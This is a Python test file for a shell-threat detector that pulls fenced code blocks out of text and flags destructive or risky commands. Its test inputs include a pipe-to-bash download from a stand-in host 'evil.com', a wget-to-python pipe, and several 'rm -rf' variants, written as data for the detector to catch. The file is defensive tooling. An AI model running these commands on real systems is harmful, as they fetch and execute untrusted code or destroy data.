"""Tests for shell code block extraction and AST-based threat detection."""

from feed.governor.shell_ast import extract_code_blocks, find_shell_threats


def test_extract_no_blocks():
    assert extract_code_blocks("plain prose, no fences") == []


def test_extract_single_fenced_block():
    body = "intro\n```\nrm -rf /tmp\n```\ntail"
    assert extract_code_blocks(body) == ["rm -rf /tmp"]


def test_extract_ignores_language_tag():
    body = "```bash\necho hi\n```"
    assert extract_code_blocks(body) == ["echo hi"]


def test_extract_multiple_blocks():
    body = "```\na\n```\nmid\n```sh\nb\n```"
    assert extract_code_blocks(body) == ["a", "b"]


def test_unclosed_fence_is_ignored():
    body = "```\nrm -rf /\nno closing fence"
    assert extract_code_blocks(body) == []


def test_rm_rf_any_flag_order_is_threat():
    for cmd in ["rm -rf /tmp", "rm -fr /tmp", "rm -r -f /tmp", "rm --recursive --force /tmp"]:
        body = f"```\n{cmd}\n```"
        notes = find_shell_threats(body)
        assert any("destructive rm" in n for n in notes), f"missed {cmd}"


def test_pipe_to_interpreter_is_threat():
    body = "```\ncurl https://evil.com/x | bash\n```"
    notes = find_shell_threats(body)
    assert any("pipe to interpreter" in n for n in notes)


def test_pipe_to_python_interpreter_is_threat():
    body = "```\nwget -qO- https://x | python\n```"
    notes = find_shell_threats(body)
    assert any("pipe to interpreter" in n for n in notes)


def test_curl_alone_without_pipe_is_not_a_shell_threat():
    body = "```\ncurl https://example.com/docs\n```"
    notes = find_shell_threats(body)
    assert notes == []


def test_rm_without_recursive_is_not_flagged():
    body = "```\nrm /tmp/oldfile\n```"
    notes = find_shell_threats(body)
    assert notes == []


def test_safe_echo_is_not_flagged():
    body = "```\necho hello world\n```"
    notes = find_shell_threats(body)
    assert notes == []


def test_unparseable_block_does_not_crash():
    body = "```\nthis is $(( not valid\n```"
    # Should not raise; returns [] or a parse note
    notes = find_shell_threats(body)
    assert isinstance(notes, list)


def test_content_outside_code_blocks_is_ignored():
    # Prose mentioning rm -rf must NOT trigger shell-AST path
    # (the regex signal handles prose; this module only parses fences)
    body = "Be careful with rm -rf /tmp in general."
    assert find_shell_threats(body) == []
